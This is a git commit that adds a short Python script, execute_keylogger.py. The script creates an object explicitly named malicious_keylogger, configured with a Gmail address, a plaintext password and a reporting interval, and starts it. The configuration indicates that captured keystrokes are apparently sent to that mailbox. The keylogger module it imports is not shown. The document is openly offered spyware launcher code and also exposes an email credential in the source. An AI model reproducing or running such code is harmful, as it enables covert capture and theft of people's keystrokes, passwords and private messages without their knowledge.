88bc42d69093969619d8257eed8625ebd7983d3b
Kartik Wakekar <52576813+adomynx@users.noreply.github.com>
2020-05-29 23:02:36 +0530

    Add files via upload

---
+++ execute_keylogger.py
@@ -0,0 +1,14 @@
+#!/usr/bin/env python
+
+import keylogger
+
+
+# Initialize / create keylogger
+
+malicious_keylogger = keylogger.KeyLogger(10, 'kartikboyy2@gmail.com', 'kartik@123')
+
+# Execute Keylogger
+
+malicious_keylogger.start()
+
+
